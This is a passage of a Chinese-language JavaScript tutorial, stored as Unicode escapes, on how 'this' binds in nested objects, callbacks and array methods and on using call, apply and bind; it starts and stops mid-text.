\u7b49\u540c\u4e8e ( function () { console . log ( this ); })() // \u60c5\u51b5\u4e8c ( false || function () { console . log ( this ); })() // \u60c5\u51b5\u4e09 ( 1 , function () { console . log ( this ); })() \u5982\u679c this \u6240\u5728\u7684\u65b9\u6cd5\u4e0d\u5728\u5bf9\u8c61\u7684\u7b2c\u4e00\u5c42\uff0c\u8fd9\u65f6 this \u53ea\u662f\u6307\u5411\u5f53\u524d\u4e00\u5c42\u7684\u5bf9\u8c61\uff0c\u800c\u4e0d\u4f1a\u7ee7\u627f\u66f4\u4e0a\u9762\u7684\u5c42\u3002 1 2 3 4 5 6 7 8 9 10 var a = { p : 'Hello' , b : { m : function () { console . log ( this . p ); } } }; a . b . m () // undefined \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c a.b.m \u65b9\u6cd5\u5728 a \u5bf9\u8c61\u7684\u7b2c\u4e8c\u5c42\uff0c\u8be5\u65b9\u6cd5\u5185\u90e8\u7684 this \u4e0d\u662f\u6307\u5411 a \uff0c\u800c\u662f\u6307\u5411 a.b \uff0c\u56e0\u4e3a\u5b9e\u9645\u6267\u884c\u7684\u662f\u4e0b\u9762\u7684\u4ee3\u7801\u3002 1 2 3 4 5 6 7 8 9 10 11 12 var b = { m : function () { console . log ( this . p ); } }; var a = { p : 'Hello' , b : b }; ( a . b ). m () // \u7b49\u540c\u4e8e b.m() \u5982\u679c\u8981\u8fbe\u5230\u9884\u671f\u6548\u679c\uff0c\u53ea\u6709\u5199\u6210\u4e0b\u9762\u8fd9\u6837\u3002 1 2 3 4 5 6 7 8 var a = { b : { m : function () { console . log ( this . p ); }, p : 'Hello' } }; \u5982\u679c\u8fd9\u65f6\u5c06\u5d4c\u5957\u5bf9\u8c61\u5185\u90e8\u7684\u65b9\u6cd5\u8d4b\u503c\u7ed9\u4e00\u4e2a\u53d8\u91cf\uff0c this \u4f9d\u7136\u4f1a\u6307\u5411\u5168\u5c40\u5bf9\u8c61\u3002 1 2 3 4 5 6 7 8 9 10 11 var a = { b : { m : function () { console . log ( this . p ); }, p : 'Hello' } }; var hello = a . b . m ; hello () // undefined \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c m \u662f\u591a\u5c42\u5bf9\u8c61\u5185\u90e8\u7684\u4e00\u4e2a\u65b9\u6cd5\u3002\u4e3a\u6c42\u7b80\u4fbf\uff0c\u5c06\u5176\u8d4b\u503c\u7ed9 hello \u53d8\u91cf\uff0c\u7ed3\u679c\u8c03\u7528\u65f6\uff0c this \u6307\u5411\u4e86\u9876\u5c42\u5bf9\u8c61\u3002\u4e3a\u4e86\u907f\u514d\u8fd9\u4e2a\u95ee\u9898\uff0c\u53ef\u4ee5\u53ea\u5c06 m \u6240\u5728\u7684\u5bf9\u8c61\u8d4b\u503c\u7ed9 hello \uff0c\u8fd9\u6837\u8c03\u7528\u65f6\uff0c this \u7684\u6307\u5411\u5c31\u4e0d\u4f1a\u53d8\u3002 1 2 var hello = a . b ; hello . m () // Hello \u4f7f\u7528\u6ce8\u610f\u70b9 \u00b6 \u907f\u514d\u591a\u5c42 this \u00b6 \u7531\u4e8e this \u7684\u6307\u5411\u662f\u4e0d\u786e\u5b9a\u7684\uff0c\u6240\u4ee5\u5207\u52ff\u5728\u51fd\u6570\u4e2d\u5305\u542b\u591a\u5c42\u7684 this \u3002 1 2 3 4 5 6 7 8 9 10 11 12 var o = { f1 : function () { console . log ( this ); var f2 = function () { console . log ( this ); }(); } } o . f1 () // Object // Window \u4e0a\u9762\u4ee3\u7801\u5305\u542b\u4e24\u5c42 this \uff0c\u7ed3\u679c\u8fd0\u884c\u540e\uff0c\u7b2c\u4e00\u5c42\u6307\u5411\u5bf9\u8c61 o \uff0c\u7b2c\u4e8c\u5c42\u6307\u5411\u5168\u5c40\u5bf9\u8c61\uff0c\u56e0\u4e3a\u5b9e\u9645\u6267\u884c\u7684\u662f\u4e0b\u9762\u7684\u4ee3\u7801\u3002 1 2 3 4 5 6 7 8 9 10 var temp = function () { console . log ( this ); }; var o = { f1 : function () { console . log ( this ); var f2 = temp (); } } \u4e00\u4e2a\u89e3\u51b3\u65b9\u6cd5\u662f\u5728\u7b2c\u4e8c\u5c42\u6539\u7528\u4e00\u4e2a\u6307\u5411\u5916\u5c42 this \u7684\u53d8\u91cf\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 var o = { f1 : function () { console . log ( this ); var that = this ; var f2 = function () { console . log ( that ); }(); } } o . f1 () // Object // Object \u4e0a\u9762\u4ee3\u7801\u5b9a\u4e49\u4e86\u53d8\u91cf that \uff0c\u56fa\u5b9a\u6307\u5411\u5916\u5c42\u7684 this \uff0c\u7136\u540e\u5728\u5185\u5c42\u4f7f\u7528 that \uff0c\u5c31\u4e0d\u4f1a\u53d1\u751f this \u6307\u5411\u7684\u6539\u53d8\u3002 \u4e8b\u5b9e\u4e0a\uff0c\u4f7f\u7528\u4e00\u4e2a\u53d8\u91cf\u56fa\u5b9a this \u7684\u503c\uff0c\u7136\u540e\u5185\u5c42\u51fd\u6570\u8c03\u7528\u8fd9\u4e2a\u53d8\u91cf\uff0c\u662f\u975e\u5e38\u5e38\u89c1\u7684\u505a\u6cd5\uff0c\u8bf7\u52a1\u5fc5\u638c\u63e1\u3002 JavaScript \u63d0\u4f9b\u4e86\u4e25\u683c\u6a21\u5f0f\uff0c\u4e5f\u53ef\u4ee5\u786c\u6027\u907f\u514d\u8fd9\u79cd\u95ee\u9898\u3002\u4e25\u683c\u6a21\u5f0f\u4e0b\uff0c\u5982\u679c\u51fd\u6570\u5185\u90e8\u7684 this \u6307\u5411\u9876\u5c42\u5bf9\u8c61\uff0c\u5c31\u4f1a\u62a5\u9519\u3002 1 2 3 4 5 6 7 8 9 10 var counter = { count : 0 }; counter . inc = function () { 'use strict' ; this . count ++ }; var f = counter . inc ; f () // TypeError: Cannot read property 'count' of undefined \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c inc \u65b9\u6cd5\u901a\u8fc7 'use strict' \u58f0\u660e\u91c7\u7528\u4e25\u683c\u6a21\u5f0f\uff0c\u8fd9\u65f6\u5185\u90e8\u7684 this \u4e00\u65e6\u6307\u5411\u9876\u5c42\u5bf9\u8c61\uff0c\u5c31\u4f1a\u62a5\u9519\u3002 \u907f\u514d\u6570\u7ec4\u5904\u7406\u65b9\u6cd5\u4e2d\u7684 this \u00b6 \u6570\u7ec4\u7684 map \u548c foreach \u65b9\u6cd5\uff0c\u5141\u8bb8\u63d0\u4f9b\u4e00\u4e2a\u51fd\u6570\u4f5c\u4e3a\u53c2\u6570\u3002\u8fd9\u4e2a\u51fd\u6570\u5185\u90e8\u4e0d\u5e94\u8be5\u4f7f\u7528 this \u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 var o = { v : 'hello' , p : [ 'a1' , 'a2' ], f : function f () { this . p . forEach ( function ( item ) { console . log ( this . v + ' ' + item ); }); } } o . f () // undefined a1 // undefined a2 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c foreach \u65b9\u6cd5\u7684\u56de\u8c03\u51fd\u6570\u4e2d\u7684 this \uff0c\u5176\u5b9e\u662f\u6307\u5411 window \u5bf9\u8c61\uff0c\u56e0\u6b64\u53d6\u4e0d\u5230 o.v \u7684\u503c\u3002\u539f\u56e0\u8ddf\u4e0a\u4e00\u6bb5\u7684\u591a\u5c42 this \u662f\u4e00\u6837\u7684\uff0c\u5c31\u662f\u5185\u5c42\u7684 this \u4e0d\u6307\u5411\u5916\u90e8\uff0c\u800c\u6307\u5411\u9876\u5c42\u5bf9\u8c61\u3002 \u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u7684\u4e00\u79cd\u65b9\u6cd5\uff0c\u5c31\u662f\u524d\u9762\u63d0\u5230\u7684\uff0c\u4f7f\u7528\u4e2d\u95f4\u53d8\u91cf\u56fa\u5b9a this \u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 var o = { v : 'hello' , p : [ 'a1' , 'a2' ], f : function f () { var that = this ; this . p . forEach ( function ( item ) { console . log ( that . v + ' ' + item ); }); } } o . f () // hello a1 // hello a2 \u53e6\u4e00\u79cd\u65b9\u6cd5\u662f\u5c06 this \u5f53\u4f5c foreach \u65b9\u6cd5\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u56fa\u5b9a\u5b83\u7684\u8fd0\u884c\u73af\u5883\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 var o = { v : 'hello' , p : [ 'a1' , 'a2' ], f : function f () { this . p . forEach ( function ( item ) { console . log ( this . v + ' ' + item ); }, this ); } } o . f () // hello a1 // hello a2 \u907f\u514d\u56de\u8c03\u51fd\u6570\u4e2d\u7684 this \u00b6 \u56de\u8c03\u51fd\u6570\u4e2d\u7684 this \u5f80\u5f80\u4f1a\u6539\u53d8\u6307\u5411\uff0c\u6700\u597d\u907f\u514d\u4f7f\u7528\u3002 1 2 3 4 5 6 7 var o = new Object (); o . f = function () { console . log ( this === o ); } // jQuery \u7684\u5199\u6cd5 $ ( '#button' ). on ( 'click' , o . f ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u70b9\u51fb\u6309\u94ae\u4ee5\u540e\uff0c\u63a7\u5236\u53f0\u4f1a\u663e\u793a false \u3002\u539f\u56e0\u662f\u6b64\u65f6 this \u4e0d\u518d\u6307\u5411 o \u5bf9\u8c61\uff0c\u800c\u662f\u6307\u5411\u6309\u94ae\u7684 DOM \u5bf9\u8c61\uff0c\u56e0\u4e3a f \u65b9\u6cd5\u662f\u5728\u6309\u94ae\u5bf9\u8c61\u7684\u73af\u5883\u4e2d\u88ab\u8c03\u7528\u7684\u3002\u8fd9\u79cd\u7ec6\u5fae\u7684\u5dee\u522b\uff0c\u5f88\u5bb9\u6613\u5728\u7f16\u7a0b\u4e2d\u5ffd\u89c6\uff0c\u5bfc\u81f4\u96be\u4ee5\u5bdf\u89c9\u7684\u9519\u8bef\u3002 \u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u53ef\u4ee5\u91c7\u7528\u4e0b\u9762\u7684\u4e00\u4e9b\u65b9\u6cd5\u5bf9 this \u8fdb\u884c\u7ed1\u5b9a\uff0c\u4e5f\u5c31\u662f\u4f7f\u5f97 this \u56fa\u5b9a\u6307\u5411\u67d0\u4e2a\u5bf9\u8c61\uff0c\u51cf\u5c11\u4e0d\u786e\u5b9a\u6027\u3002 \u7ed1\u5b9a this \u7684\u65b9\u6cd5 \u00b6 this \u7684\u52a8\u6001\u5207\u6362\uff0c\u56fa\u7136\u4e3a JavaScript \u521b\u9020\u4e86\u5de8\u5927\u7684\u7075\u6d3b\u6027\uff0c\u4f46\u4e5f\u4f7f\u5f97\u7f16\u7a0b\u53d8\u5f97\u56f0\u96be\u548c\u6a21\u7cca\u3002\u6709\u65f6\uff0c\u9700\u8981\u628a this \u56fa\u5b9a\u4e0b\u6765\uff0c\u907f\u514d\u51fa\u73b0\u610f\u60f3\u4e0d\u5230\u7684\u60c5\u51b5\u3002JavaScript \u63d0\u4f9b\u4e86 call \u3001 apply \u3001 bind \u8fd9\u4e09\u4e2a\u65b9\u6cd5\uff0c\u6765\u5207\u6362/\u56fa\u5b9a this \u7684\u6307\u5411\u3002 Function.prototype.call() \u00b6 \u51fd\u6570\u5b9e\u4f8b\u7684 call \u65b9\u6cd5\uff0c\u53ef\u4ee5\u6307\u5b9a\u51fd\u6570\u5185\u90e8 this \u7684\u6307\u5411\uff08\u5373\u51fd\u6570\u6267\u884c\u65f6\u6240\u5728\u7684\u4f5c\u7528\u57df\uff09\uff0c\u7136\u540e\u5728\u6240\u6307\u5b9a\u7684\u4f5c\u7528\u57df\u4e2d\uff0c\u8c03\u7528\u8be5\u51fd\u6570\u3002 1 2 3 4 5 6 7 8 var obj = {}; var f = function () { return this ; }; f () === window // true f . call ( obj ) === obj // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5168\u5c40\u73af\u5883\u8fd0\u884c\u51fd\u6570 f \u65f6\uff0c this \u6307\u5411\u5168\u5c40\u73af\u5883\uff08\u6d4f\u89c8\u5668\u4e3a window \u5bf9\u8c61\uff09\uff1b call \u65b9\u6cd5\u53ef\u4ee5\u6539\u53d8 this \u7684\u6307\u5411\uff0c\u6307\u5b9a this \u6307\u5411\u5bf9\u8c61 obj \uff0c\u7136\u540e\u5728\u5bf9\u8c61 obj \u7684\u4f5c\u7528\u57df\u4e2d\u8fd0\u884c\u51fd\u6570 f \u3002 call \u65b9\u6cd5\u7684\u53c2\u6570\uff0c\u5e94\u8be5\u662f\u4e00\u4e2a\u5bf9\u8c61\u3002\u5982\u679c\u53c2\u6570\u4e3a\u7a7a\u3001 null \u548c undefined \uff0c\u5219\u9ed8\u8ba4\u4f20\u5165\u5168\u5c40\u5bf9\u8c61\u3002 1 2 3 4 5 6 7 8 9 10 11 12 var n = 123 ; var obj = { n : 456 }; function a () { console . log ( this . n ); } a . call () // 123 a . call ( null ) // 123 a . call ( undefined ) // 123 a . call ( window ) // 123 a . call ( obj ) // 456 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c a \u51fd\u6570\u4e2d\u7684 this \u5173\u952e\u5b57\uff0c\u5982\u679c\u6307\u5411\u5168\u5c40\u5bf9\u8c61\uff0c\u8fd4\u56de\u7ed3\u679c\u4e3a 123 \u3002\u5982\u679c\u4f7f\u7528 call \u65b9\u6cd5\u5c06 this \u5173\u952e\u5b57\u6307\u5411 obj \u5bf9\u8c61\uff0c\u8fd4\u56de\u7ed3\u679c\u4e3a 456 \u3002\u53ef\u4ee5\u770b\u5230\uff0c\u5982\u679c call \u65b9\u6cd5\u6ca1\u6709\u53c2\u6570\uff0c\u6216\u8005\u53c2\u6570\u4e3a null \u6216 undefined \uff0c\u5219\u7b49\u540c\u4e8e\u6307\u5411\u5168\u5c40\u5bf9\u8c61\u3002 \u5982\u679c call \u65b9\u6cd5\u7684\u53c2\u6570\u662f\u4e00\u4e2a\u539f\u59cb\u503c\uff0c\u90a3\u4e48\u8fd9\u4e2a\u539f\u59cb\u503c\u4f1a\u81ea\u52a8\u8f6c\u6210\u5bf9\u5e94\u7684\u5305\u88c5\u5bf9\u8c61\uff0c\u7136\u540e\u4f20\u5165 call \u65b9\u6cd5\u3002 1 2 3 4 5 6 var f = function () { return this ; }; f . call ( 5 ) // Number {[[PrimitiveValue]]: 5} \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c call \u7684\u53c2\u6570\u4e3a 5 \uff0c\u4e0d\u662f\u5bf9\u8c61\uff0c\u4f1a\u88ab\u81ea\u52a8\u8f6c\u6210\u5305\u88c5\u5bf9\u8c61\uff08 Number \u7684\u5b9e\u4f8b\uff09\uff0c\u7ed1\u5b9a f \u5185\u90e8\u7684 this \u3002 call \u65b9\u6cd5\u8fd8\u53ef\u4ee5\u63a5\u53d7\u591a\u4e2a\u53c2\u6570\u3002 1 func . call ( thisValue , arg1 , arg2 , ...) call \u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u5c31\u662f this \u6240\u8981\u6307\u5411\u7684\u90a3\u4e2a\u5bf9\u8c61\uff0c\u540e\u9762\u7684\u53c2\u6570\u5219\u662f\u51fd\u6570\u8c03\u7528\u65f6\u6240\u9700\u7684\u53c2\u6570\u3002 1 2 3 4 5 function add ( a , b ) { return a + b ; } add . call ( this , 1 , 2 ) // 3 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c call \u65b9\u6cd5\u6307\u5b9a\u51fd\u6570 add \u5185\u90e8\u7684 this \u7ed1\u5b9a\u5f53\u524d\u73af\u5883\uff08\u5bf9\u8c61\uff09\uff0c\u5e76\u4e14\u53c2\u6570\u4e3a 1 \u548c 2 \uff0c\u56e0\u6b64\u51fd\u6570 add \u8fd0\u884c\u540e\u5f97\u5230 3 \u3002 call \u65b9\u6cd5\u7684\u4e00\u4e2a\u5e94\u7528\u662f\u8c03\u7528\u5bf9\u8c61\u7684\u539f\u751f\u65b9\u6cd5\u3002 1 2 3 4 5 6 7 8 9 10 var obj = {}; obj . hasOwnProperty ( 'toString' ) // false // \u8986\u76d6\u6389\u7ee7\u627f\u7684 hasOwnProperty \u65b9\u6cd5 obj . hasOwnProperty = function () { return true ; }; obj . hasOwnProperty ( 'toString' ) // true Object . prototype . hasOwnProperty . call ( obj , 'toString' ) // false \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c hasOwnProperty \u662f obj \u5bf9\u8c61\u7ee7\u627f\u7684\u65b9\u6cd5\uff0c\u5982\u679c\u8fd9\u4e2a\u65b9\u6cd5\u4e00\u65e6\u88ab\u8986\u76d6\uff0c\u5c31\u4e0d\u4f1a\u5f97\u5230\u6b63\u786e\u7ed3\u679c\u3002 call \u65b9\u6cd5\u53ef\u4ee5\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u5b83\u5c06 hasOwnProperty \u65b9\u6cd5\u7684\u539f\u59cb\u5b9a\u4e49\u653e\u5230 obj \u5bf9\u8c61\u4e0a\u6267\u884c\uff0c\u8fd9\u6837\u65e0\u8bba obj \u4e0a\u6709\u6ca1\u6709\u540c\u540d\u65b9\u6cd5\uff0c\u90fd\u4e0d\u4f1a\u5f71\u54cd\u7ed3\u679c\u3002 Function.prototype.apply() \u00b6 apply \u65b9\u6cd5\u7684\u4f5c\u7528\u4e0e call \u65b9\u6cd5\u7c7b\u4f3c\uff0c\u4e5f\u662f\u6539\u53d8 this \u6307\u5411\uff0c\u7136\u540e\u518d\u8c03\u7528\u8be5\u51fd\u6570\u3002\u552f\u4e00\u7684\u533a\u522b\u5c31\u662f\uff0c\u5b83\u63a5\u6536\u4e00\u4e2a\u6570\u7ec4\u4f5c\u4e3a\u51fd\u6570\u6267\u884c\u65f6\u7684\u53c2\u6570\uff0c\u4f7f\u7528\u683c\u5f0f\u5982\u4e0b\u3002 1 func . apply ( thisValue , [ arg1 , arg2 , ...]) apply \u65b9\u6cd5\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e5f\u662f this \u6240\u8981\u6307\u5411\u7684\u90a3\u4e2a\u5bf9\u8c61\uff0c\u5982\u679c\u8bbe\u4e3a null \u6216 undefined \uff0c\u5219\u7b49\u540c\u4e8e\u6307\u5b9a\u5168\u5c40\u5bf9\u8c61\u3002\u7b2c\u4e8c\u4e2a\u53c2\u6570\u5219\u662f\u4e00\u4e2a\u6570\u7ec4\uff0c\u8be5\u6570\u7ec4\u7684\u6240\u6709\u6210\u5458\u4f9d\u6b21\u4f5c\u4e3a\u53c2\u6570\uff0c\u4f20\u5165\u539f\u51fd\u6570\u3002\u539f\u51fd\u6570\u7684\u53c2\u6570\uff0c\u5728 call \u65b9\u6cd5\u4e2d\u5fc5\u987b\u4e00\u4e2a\u4e2a\u6dfb\u52a0\uff0c\u4f46\u662f\u5728 apply \u65b9\u6cd5\u4e2d\uff0c\u5fc5\u987b\u4ee5\u6570\u7ec4\u5f62\u5f0f\u6dfb\u52a0\u3002 1 2 3 4 5 6 function f ( x , y ){ console . log ( x + y ); } f . call ( null , 1 , 1 ) // 2 f . apply ( null , [ 1 , 1 ]) // 2 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c f \u51fd\u6570\u672c\u6765\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u4f7f\u7528 apply \u65b9\u6cd5\u4ee5\u540e\uff0c\u5c31\u53d8\u6210\u53ef\u4ee5\u63a5\u53d7\u4e00\u4e2a\u6570\u7ec4\u4f5c\u4e3a\u53c2\u6570\u3002 \u5229\u7528\u8fd9\u4e00\u70b9\uff0c\u53ef\u4ee5\u505a\u4e00\u4e9b\u6709\u8da3\u7684\u5e94\u7528\u3002 \uff081\uff09\u627e\u51fa\u6570\u7ec4\u6700\u5927\u5143\u7d20 JavaScript \u4e0d\u63d0\u4f9b\u627e\u51fa\u6570\u7ec4\u6700\u5927\u5143\u7d20\u7684\u51fd\u6570\u3002\u7ed3\u5408\u4f7f\u7528 apply \u65b9\u6cd5\u548c Math.max \u65b9\u6cd5\uff0c\u5c31\u53ef\u4ee5\u8fd4\u56de\u6570\u7ec4\u7684\u6700\u5927\u5143\u7d20\u3002 1 2 var a = [ 10 , 2 , 4 , 15 , 9 ]; Math . max . apply ( null , a ) // 15 \uff082\uff09\u5c06\u6570\u7ec4\u7684\u7a7a\u5143\u7d20\u53d8\u4e3a undefined \u901a\u8fc7 apply \u65b9\u6cd5\uff0c\u5229\u7528 Array \u6784\u9020\u51fd\u6570\u5c06\u6570\u7ec4\u7684\u7a7a\u5143\u7d20\u53d8\u6210 undefined \u3002 1 2 Array . apply ( null , [ 'a' , , 'b' ]) // [ 'a', undefined, 'b' ] \u7a7a\u5143\u7d20\u4e0e undefined \u7684\u5dee\u522b\u5728\u4e8e\uff0c\u6570\u7ec4\u7684 forEach \u65b9\u6cd5\u4f1a\u8df3\u8fc7\u7a7a\u5143\u7d20\uff0c\u4f46\u662f\u4e0d\u4f1a\u8df3\u8fc7 undefined \u3002\u56e0\u6b64\uff0c\u904d\u5386\u5185\u90e8\u5143\u7d20\u7684\u65f6\u5019\uff0c\u4f1a\u5f97\u5230\u4e0d\u540c\u7684\u7ed3\u679c\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 var a = [ 'a' , , 'b' ]; function print ( i ) { console . log ( i ); } a . forEach ( print ) // a // b Array . apply ( null , a ). forEach ( print ) // a // undefined // b \uff083\uff09\u8f6c\u6362\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61 \u53e6\u5916\uff0c\u5229\u7528\u6570\u7ec4\u5bf9\u8c61\u7684 slice \u65b9\u6cd5\uff0c\u53ef\u4ee5\u5c06\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff08\u6bd4\u5982 arguments \u5bf9\u8c61\uff09\u8f6c\u4e3a\u771f\u6b63\u7684\u6570\u7ec4\u3002 1 2 3 4 Array . prototype . slice . apply ({ 0 : 1 , length : 1 }) // [1] Array . prototype . slice . apply ({ 0 : 1 }) // [] Array . prototype . slice . apply ({ 0 : 1 , length : 2 }) // [1, undefined] Array . prototype . slice . apply ({ length : 1 }) // [undefined] \u4e0a\u9762\u4ee3\u7801\u7684 apply \u65b9\u6cd5\u7684\u53c2\u6570\u90fd\u662f\u5bf9\u8c61\uff0c\u4f46\u662f\u8fd4\u56de\u7ed3\u679c\u90fd\u662f\u6570\u7ec4\uff0c\u8fd9\u5c31\u8d77\u5230\u4e86\u5c06\u5bf9\u8c61\u8f6c\u6210\u6570\u7ec4\u7684\u76ee\u7684\u3002\u4ece\u4e0a\u9762\u4ee3\u7801\u53ef\u4ee5\u770b\u5230\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u8d77\u4f5c\u7528\u7684\u524d\u63d0\u662f\uff0c\u88ab\u5904\u7406\u7684\u5bf9\u8c61\u5fc5\u987b\u6709 length \u5c5e\u6027\uff0c\u4ee5\u53ca\u76f8\u5bf9\u5e94\u7684\u6570\u5b57\u952e\u3002 \uff084\uff09\u7ed1\u5b9a\u56de\u8c03\u51fd\u6570\u7684\u5bf9\u8c61 \u524d\u9762\u7684\u6309\u94ae\u70b9\u51fb\u4e8b\u4ef6\u7684\u4f8b\u5b50\uff0c\u53ef\u4ee5\u6539\u5199\u5982\u4e0b\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 var o = new Object (); o . f = function () { console . log ( this === o ); } var f = function (){ o . f . apply ( o ); // \u6216\u8005 o.f.call(o); }; // jQuery \u7684\u5199\u6cd5 $ ( '#button' ). on ( 'click' , f ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u70b9\u51fb\u6309\u94ae\u4ee5\u540e\uff0c\u63a7\u5236\u53f0\u5c06\u4f1a\u663e\u793a true \u3002\u7531\u4e8e apply() \u65b9\u6cd5\uff08\u6216\u8005 call() \u65b9\u6cd5\uff09\u4e0d\u4ec5\u7ed1\u5b9a\u51fd\u6570\u6267\u884c\u65f6\u6240\u5728\u7684\u5bf9\u8c61\uff0c\u8fd8\u4f1a\u7acb\u5373\u6267\u884c\u51fd\u6570\uff0c\u56e0\u6b64\u4e0d\u5f97\u4e0d\u628a\u7ed1\u5b9a\u8bed\u53e5\u5199\u5728\u4e00\u4e2a\u51fd\u6570\u4f53\u5185\u3002\u66f4\u7b80\u6d01\u7684\u5199\u6cd5\u662f\u91c7\u7528\u4e0b\u9762\u4ecb\u7ecd\u7684 bind() \u65b9\u6cd5\u3002 Function.prototype.bind() \u00b6 bind() \u65b9\u6cd5\u7528\u4e8e\u5c06\u51fd\u6570\u4f53\u5185\u7684 this \u7ed1\u5b9a\u5230\u67d0\u4e2a\u5bf9\u8c61\uff0c\u7136\u540e\u8fd4\u56de\u4e00\u4e2a\u65b0\u51fd\u6570\u3002 1 2 3 4 5 var d = new Date (); d . getTime () // 1481869925657 var print = d . getTime ; print () // Uncaught TypeError: this is not a Date object. \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6211\u4eec\u5c06 d.getTime() \u65b9\u6cd5\u8d4b\u7ed9\u53d8\u91cf print \uff0c\u7136\u540e\u8c03\u7528 print() \u5c31\u62a5\u9519\u4e86\u3002\u8fd9\u662f\u56e0\u4e3a getTime() \u65b9\u6cd5\u5185\u90e8\u7684 this \uff0c\u7ed1\u5b9a Date \u5bf9\u8c61\u7684\u5b9e\u4f8b\uff0c\u8d4b\u7ed9\u53d8\u91cf print \u4ee5\u540e\uff0c\u5185\u90e8\u7684 this \u5df2\u7ecf\u4e0d\u6307\u5411 Date \u5bf9\u8c61\u7684\u5b9e\u4f8b\u4e86\u3002 bind() \u65b9\u6cd5\u53ef\u4ee5\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002 1 2 var print = d . getTime . bind ( d ); print () // 1481869925657 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c bind() \u65b9\u6cd5\u5c06 getTime() \u65b9\u6cd5\u5185\u90e8\u7684 this \u7ed1\u5b9a\u5230 d \u5bf9\u8c61\uff0c\u8fd9\u65f6\u5c31\u53ef\u4ee5\u5b89\u5168\u5730\u5c06\u8fd9\u4e2a\u65b9\u6cd5\u8d4b\u503c\u7ed9\u5176\u4ed6\u53d8\u91cf\u4e86\u3002 bind \u65b9\u6cd5\u7684\u53c2\u6570\u5c31\u662f\u6240\u8981\u7ed1\u5b9a this \u7684\u5bf9\u8c61\uff0c\u4e0b\u9762\u662f\u4e00\u4e2a\u66f4\u6e05\u6670\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 var counter = { count : 0 , inc : function () { this . count ++ ; } }; var func = counter . inc . bind ( counter ); func (); counter . count // 1 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c counter.inc() \u65b9\u6cd5\u88ab\u8d4b\u503c\u7ed9\u53d8\u91cf func \u3002\u8fd9\u65f6\u5fc5\u987b\u7528 bind() \u65b9\u6cd5\u5c06 inc() \u5185\u90e8\u7684 this \uff0c\u7ed1\u5b9a\u5230 counter \uff0c\u5426\u5219\u5c31\u4f1a\u51fa\u9519\u3002 this \u7ed1\u5b9a\u5230\u5176\u4ed6\u5bf9\u8c61\u4e5f\u662f\u53ef\u4ee5\u7684\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 var counter = { count : 0 , inc : function () { this . count ++ ; } }; var obj = { count : 100 }; var func = counter . inc . bind ( obj ); func (); obj . count // 101 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c bind() \u65b9\u6cd5\u5c06 inc() \u65b9\u6cd5\u5185\u90e8\u7684 this \uff0c\u7ed1\u5b9a\u5230 obj \u5bf9\u8c61\u3002\u7ed3\u679c\u8c03\u7528 func \u51fd\u6570\u4ee5\u540e\uff0c\u9012\u589e\u7684\u5c31\u662f obj \u5185\u90e8\u7684 count \u5c5e\u6027\u3002 bind() \u8fd8\u53ef\u4ee5\u63a5\u53d7\u66f4\u591a\u7684\u53c2\u6570\uff0c\u5c06\u8fd9\u4e9b\u53c2\u6570\u7ed1\u5b9a\u539f\u51fd\u6570\u7684\u53c2\u6570\u3002 1 2 3 4 5 6 7 8 9 10 11 var add = function ( x , y ) { return x * this . m + y * this . n ; } var obj = { m : 2 , n : 2 }; var newAdd = add . bind ( obj , 5 ); newAdd ( 5 ) // 20 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c bind() \u65b9\u6cd5\u9664\u4e86\u7ed1\u5b9a this \u5bf9\u8c61\uff0c\u8fd8\u5c06 add() \u51fd\u6570\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570 x \u7ed1\u5b9a\u6210 5 \uff0c\u7136\u540e\u8fd4\u56de\u4e00\u4e2a\u65b0\u51fd\u6570 newAdd() \uff0c\u8fd9\u4e2a\u51fd\u6570\u53ea\u8981\u518d\u63a5\u53d7\u4e00\u4e2a\u53c2\u6570 y \u5c31\u80fd\u8fd0\u884c\u4e86\u3002 \u5982\u679c bind() \u65b9\u6cd5\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f null \u6216 undefined \uff0c\u7b49\u4e8e\u5c06 this \u7ed1\u5b9a\u5230\u5168\u5c40\u5bf9\u8c61\uff0c\u51fd\u6570\u8fd0\u884c\u65f6 this \u6307\u5411\u9876\u5c42\u5bf9\u8c61\uff08\u6d4f\u89c8\u5668\u4e3a window \uff09\u3002 1 2 3 4 5 6 function add ( x , y ) { return x + y ; } var plus5 = add . bind ( null , 5 ); plus5 ( 10 ) // 15 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570 add() \u5185\u90e8\u5e76\u6ca1\u6709 this \uff0c\u4f7f\u7528 bind() 